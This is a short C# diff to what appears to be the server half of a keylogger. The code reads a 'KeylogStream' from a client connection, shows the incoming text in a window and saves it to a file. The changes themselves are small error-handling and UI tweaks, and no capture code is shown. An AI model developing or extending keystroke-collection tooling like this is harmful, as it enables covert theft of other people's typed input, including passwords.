@@ -27,7 +27,7 @@ namespace Server
         {
             KeylogStream = clientLog.GetStream();
             KeylogStream.Flush();
-            while (clientLog.Connected)
+            while (true)
             {
                 try
                 {
@@ -38,12 +38,11 @@ namespace Server
                         string GetLog = Encoding.UTF8.GetString(data, 0, numBytesRead);
                         richTextBox1.Text += GetLog;
                     }
-
                 }
                 catch (Exception ex)
                 {
                     MessageBox.Show(ex.Message);
-
+                    this.Close();
                 }
             }
         }
@@ -57,12 +56,14 @@ namespace Server
                 FileStream fs = new FileStream(filePath, FileMode.Create);
                 StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
                 sr.Write(content);
+                MessageBox.Show("Saved at " + filePath);
                 sr.Close();
                 fs.Close();
             }
             catch (Exception exc)
             {
                 MessageBox.Show(exc.Message);
+                this.Close();
             }
 
         }
